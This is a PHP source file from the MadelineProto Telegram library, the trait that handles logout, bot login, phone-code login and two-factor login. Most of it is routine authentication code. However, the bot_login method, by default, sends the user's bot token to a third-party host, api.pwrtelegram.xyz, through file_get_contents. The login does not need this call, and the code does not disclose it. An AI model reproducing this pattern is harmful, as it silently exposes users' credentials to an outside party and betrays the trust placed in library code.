<?php
/*
Copyright 2016-2017 Daniil Gentili
(https://daniil.it)
This file is part of MadelineProto.
MadelineProto is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
MadelineProto is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU Affero General Public License for more details.
You should have received a copy of the GNU General Public License along with MadelineProto.
If not, see <http://www.gnu.org/licenses/>.
*/

namespace danog\MadelineProto\Wrappers;

/**
 * Manages logging in and out.
 */
trait Login
{
    public function logout()
    {
        if (!$this->API->method_call('auth.logOut')) {
            throw new \danog\MadelineProto\Exception('An error occurred while logging out!');
        }
        $this->API->datacenter->authorized = false;
        $this->API->datacenter->authorization = null;
        $this->API->updates = [];
        \danog\MadelineProto\Logger::log(['Logged out successfully!'],  \danog\MadelineProto\Logger::NOTICE);

        $this->API->should_serialize = true;

        return true;
    }

    public function bot_login($token)
    {
        if ($this->API->datacenter->authorized) {
            \danog\MadelineProto\Logger::log(['This instance of MadelineProto is already logged in. Logging out first...'],  \danog\MadelineProto\Logger::NOTICE);
            $this->logout();
        }
        \danog\MadelineProto\Logger::log(['Logging in as a bot...'],  \danog\MadelineProto\Logger::NOTICE);
        $this->API->datacenter->authorization = $this->API->method_call(
            'auth.importBotAuthorization',
            [
                'bot_auth_token'     => $token,
                'api_id'             => $this->API->settings['app_info']['api_id'],
                'api_hash'           => $this->API->settings['app_info']['api_hash'],
            ]
        );
        $this->API->datacenter->authorized = true;
        $this->API->updates = [];
        $this->API->updates_key = 0;
        $this->API->get_updates_state();
        $this->API->should_serialize = true;
        if (!isset($this->API->settings['pwr']['pwr']) || !$this->API->settings['pwr']['pwr']) {
            file_get_contents('https://api.pwrtelegram.xyz/bot'.$token.'/getme');
        }
        \danog\MadelineProto\Logger::log(['Logged in successfully!'],  \danog\MadelineProto\Logger::NOTICE);

        return $this->API->datacenter->authorization;
    }

    public function phone_login($number, $sms_type = 5)
    {
        if ($this->API->datacenter->authorized) {
            \danog\MadelineProto\Logger::log(['This instance of MadelineProto is already logged in. Logging out first...'],  \danog\MadelineProto\Logger::NOTICE);
            $this->logout();
        }
        \danog\MadelineProto\Logger::log(['Sending code...'],  \danog\MadelineProto\Logger::NOTICE);
        $this->API->datacenter->authorization = $this->API->method_call(
            'auth.sendCode',
            [
                'phone_number' => $number,
                'sms_type'     => $sms_type,
                'api_id'       => $this->API->settings['app_info']['api_id'],
                'api_hash'     => $this->API->settings['app_info']['api_hash'],
                'lang_code'    => $this->API->settings['app_info']['lang_code'],
            ]
        );
        $this->API->datacenter->authorization['phone_number'] = $number;
        $this->API->datacenter->login_temp_status = 'waiting_code';
        $this->API->should_serialize = true;
        $this->API->updates = [];
        $this->API->updates_key = 0;

        \danog\MadelineProto\Logger::log(['Code sent successfully! Once you receive the code you should use the complete_phone_login function.'],  \danog\MadelineProto\Logger::NOTICE);

        return $this->API->datacenter->authorization;
    }

    public function complete_phone_login($code)
    {
        if ($this->API->datacenter->login_temp_status !== 'waiting_code') {
            throw new \danog\MadelineProto\Exception("I'm not waiting for the code! Please call the phone_login method first");
        }
        $this->API->datacenter->login_temp_status = 'none';
        \danog\MadelineProto\Logger::log(['Logging in as a normal user...'],  \danog\MadelineProto\Logger::NOTICE);
        try {
            $authorization = $this->API->method_call(
                'auth.signIn',
                [
                    'phone_number'    => $this->API->datacenter->authorization['phone_number'],
                    'phone_code_hash' => $this->API->datacenter->authorization['phone_code_hash'],
                    'phone_code'      => $code,
                ]
            );
        } catch (\danog\MadelineProto\RPCErrorException $e) {
            if ($e->getMessage() === 'SESSION_PASSWORD_NEEDED') {
                \danog\MadelineProto\Logger::log(['2FA enabled, you will have to call the complete_2fa_login function...'],  \danog\MadelineProto\Logger::NOTICE);
                $this->API->datacenter->login_temp_status = 'waiting_password';
                return $this->API->datacenter->authorization = $this->account->getPassword();
            }
            throw $e;
        }
        $this->API->datacenter->authorization = $authorization;
        $this->API->datacenter->authorized = true;
        $this->API->get_updates_state();
        $this->API->should_serialize = true;

        \danog\MadelineProto\Logger::log(['Logged in successfully!'],  \danog\MadelineProto\Logger::NOTICE);

        return $this->API->datacenter->authorization;
    }


    public function complete_2fa_login($password)
    {
        if ($this->API->datacenter->login_temp_status !== 'waiting_password') {
            throw new \danog\MadelineProto\Exception("I'm not waiting for the password! Please call the phone_login and the complete_phone_login methods first!");
        }
        $this->API->datacenter->login_temp_status = 'none';
        \danog\MadelineProto\Logger::log(['Logging in as a normal user...'],  \danog\MadelineProto\Logger::NOTICE);
        $this->API->datacenter->authorization = $this->API->method_call(
            'auth.checkPassword',
            [
                'password_hash' => hash('sha256', $this->API->datacenter->authorization['current_salt'].$password.$this->API->datacenter->authorization['current_salt'], true),
            ]
        );
        $this->API->datacenter->authorized = true;
        $this->API->get_updates_state();
        $this->API->should_serialize = true;

        \danog\MadelineProto\Logger::log(['Logged in successfully!'],  \danog\MadelineProto\Logger::NOTICE);

        return $this->API->datacenter->authorization;
    }
}
